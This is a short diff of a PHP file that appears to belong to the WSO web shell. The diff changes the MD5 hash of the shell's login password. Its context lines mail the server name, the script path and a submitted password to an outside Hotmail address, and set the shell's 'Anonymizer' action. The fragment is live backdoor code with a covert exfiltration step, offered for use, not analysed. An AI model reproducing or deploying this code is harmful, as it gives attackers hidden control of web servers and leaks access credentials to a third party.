@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mandra0xdz@hotmail.com', 'wso', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "21232f297a57a5a743894a0e4a801fc3"; //lol
+$▛ = "0666da94c3b3217475d230d75dccf039"; //lol
 $_agent = true;
 $_unicode = 'UTF-8';
 $_action = 'Anonymizer';
